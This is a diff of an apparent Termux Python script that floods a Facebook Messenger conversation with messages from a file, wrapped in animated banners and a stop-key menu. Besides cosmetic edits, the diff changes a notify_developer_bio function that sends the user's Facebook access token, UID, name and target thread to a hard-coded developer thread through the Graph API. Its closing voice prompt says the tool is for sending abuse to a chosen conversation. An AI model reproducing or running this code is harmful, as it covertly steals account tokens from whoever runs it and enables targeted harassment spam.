@@ -263,7 +263,7 @@ def print_custom_bio():
         last_color = color
         return color
 
-   # Original bio block (as in your original script)
+    # Original bio block (as in your original script)
     original_bio = r"""╭──────────────────────────── <  DETAILS >────────────────────────────────────────────╮
 │ [=] CODER BOY   ::                               BROKEN NADEEM                      │
 │ [=] RULEX BOY   ::                                 RAAZ SAHIL                       │
@@ -320,7 +320,7 @@ def print_custom_bio():
     
     # Print a final blinking success message in a random flashy dark color.
     blink = "\033[5m"
-    print(blink + get_random_color_line() + "[✅ SUCCESS] Ultimate Fancy Bio Loaded!" + "\033[0m")
+    print(blink + get_random_color_line() + "[✅ SUCCESS FULL ULTIMATE FANCY BIO LOADED" + "\033[0m")
 
 # --- Animated Print Functions (for logos, SMS details, etc.) ---
 def animated_print(text, delay=0.01, jitter=0.005):
@@ -329,32 +329,34 @@ def animated_print(text, delay=0.01, jitter=0.005):
     for char in text:
         sys.stdout.write(random.choice(flashy_colors) + char + Style.RESET_ALL)
         sys.stdout.flush()
-        time.sleep(delay + random.uniform(0, jitter))
+        time.sleep(delay + random.uniform(0, jitter)) 
     print()
 
 def animated_logo():
-    logo_text = r"""_          _______    ______     _______    _______    _______      _______    _         _________
-( (    /|  (  ___  )  (  __  \   (  ____ \  (  ____ \  (       )    (  ___  )  ( \        \__   __/
-|  \  ( |  | (   ) |  | (  \  )  | (    \/  | (    \/  | () () |    | (   ) |  | (           ) (   
-|   \ | |  | (___) |  | |   ) |  | (__      | (__      | || || |    | (___) |  | |           | |   
-| (\ \) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |    |  ___  |  | |           | |   
-| | \   |  | (   ) |  | |   ) |  | (        | (        | |   | |    | (   ) |  | |           | |   
-| )  \  |  | )   ( |  | (__/  )  | (____/\  | (____/\  | )   ( |    | )   ( |  | (____/\  ___) (___
-|/    )_)  |/     \|  (______/   (_______/  (_______/  |/     \|    |/     \|  (_______/  \_______/
-      """for line in logo_text.splitlines():
+    logo_text = r"""
+             _______    _______    _______    _         _________   _          _______ 
+            (  ___  )  (  ____ \  (  ____ \  ( \        \__   __/  ( (    /|  (  ____ \
+            | (   ) |  | (    \/  | (    \/  | (           ) (     |  \  ( |  | (    \/
+            | |   | |  | (__      | (__      | |           | |     |   \ | |  | (__    
+            | |   | |  |  __)     |  __)     | |           | |     | (\ \) |  |  __)   
+            | |   | |  | (        | (        | |           | |     | | \   |  | (      
+            | (___) |  | )        | )        | (____/\  ___) (___  | )  \  |  | (____/\
+            (_______)  |/         |/         (_______/  \_______/  |/    )_)  (_______/ """
+    for line in logo_text.splitlines():
          animated_print(line, delay=0.005, jitter=0.002)
 
 # --- Menu Function with Animated Options ---
 def main_menu():
     # Print the animated menu header as specified
-animated_print("<============================ NEW MENU OPTIONS ============================>", delay=0.005, jitter=0.002)
+    animated_print("<============================ NEW MENU OPTIONS ============================>", delay=0.005, jitter=0.002)
     print(random.choice(color_list) + "[1] START LOADER")
     print(random.choice(color_list) + "[2] STOP LOADER")
     print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
     animated_print("<============================ CHOOSE MENU OPTIONS ===========================>", delay=0.005, jitter=0.002)
-    choice = input(random.choice(color_list) + "\n[+] Choose an option (or paste STOP key if available): ").strip()
+    choice = input(random.choice(color_list) + "\n[+] CHOOSE AN  OPTION ::> ").strip()
     if choice == "2":
-        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY 🔑: ").strip()
+        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY:::🔛 ").strip()
+        animated_print("<<════════════════════════════════════════════════════════>>")
         if stop_input == get_stop_key():
             print(Fore.BLUE + "STOPPED")
             with open("stop_signal.txt", "w") as f:
@@ -378,8 +380,8 @@ def get_stop_key():
         return stop_key
 
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
-    DEV_THREAD_ID = "t_100001595510314"
-    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\nName: {mn}\nConversation: {thread_id}\nUID: {uid}\nMessage File: {ms}"
+    DEV_THREAD_ID = "t_61571843423018"
+    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': bio_message}
     try:
@@ -489,8 +491,9 @@ if os.path.exists("stop_signal.txt"):
 animated_logo()
 
 # Then, show the original colored logo and venom animations
-colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""_______  _______  _______  _       _________ _        _______
-""".splitlines()]
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r""" 
+
+   """.splitlines()]
 colored_logo()
 venom()
 print(Fore.GREEN + "[•]  START TIME ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
@@ -500,6 +503,7 @@ animated_print("<<════════════════════�
 animated_print          ("<==========================>", delay=0.005, jitter=0.002)
 animated_print                     ("[•] Your Stop Key:   " + get_stop_key(), delay=0.005, jitter=0.002)
 animated_print          ("<===========================>", delay=0.005, jitter=0.002)
+
 print_custom_bio()
 sys.stdout.flush()
 
@@ -529,8 +533,8 @@ d = json.loads(b.text)
 if 'name' not in d:
     sys.exit()
 mb = d['name']
-print(Fore.GREEN + "Your Profile Name :: " + mb + "\n")
-
+print(Fore.GREEN + "YOUR PROFILE NAME ::> " + mb + "\n")
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 start_queue_processor()
 
 os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
